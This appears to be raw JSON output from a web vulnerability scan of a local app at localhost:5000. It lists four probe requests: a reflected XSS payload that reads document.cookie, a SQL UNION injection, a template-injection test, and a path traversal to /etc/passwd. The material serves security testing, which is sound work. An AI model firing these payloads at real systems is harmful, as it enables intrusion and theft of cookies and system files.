raw_output: {"http_records": [{"method": "GET", "url": "http://localhost:5000/users?q=<script>alert(document.cookie)</script>&page=1", "headers": {"Host": "localhost:5000"}, "notes": "XSS via reflected q parameter"}, {"method": "GET", "url": "http://localhost:5000/users?q=' UNION SELECT * FROM users--&page=1", "headers": {"Host": "localhost:5000"}, "notes": "SQLi via search parameter"}, {"method": "POST", "url": "http://localhost:5000/users", "headers": {"Host": "localhost:5000", "Content-Type": "application/json"}, "body": "{\"name\": \"{{7*7}}\", \"email\": \"test@example.com\"}", "notes": "SSTI in name field"}, {"method": "POST", "url": "http://localhost:5000/upload?file=../../../etc/passwd", "headers": {"Host": "localhost:5000"}, "notes": "Path traversal via file parameter"}]}
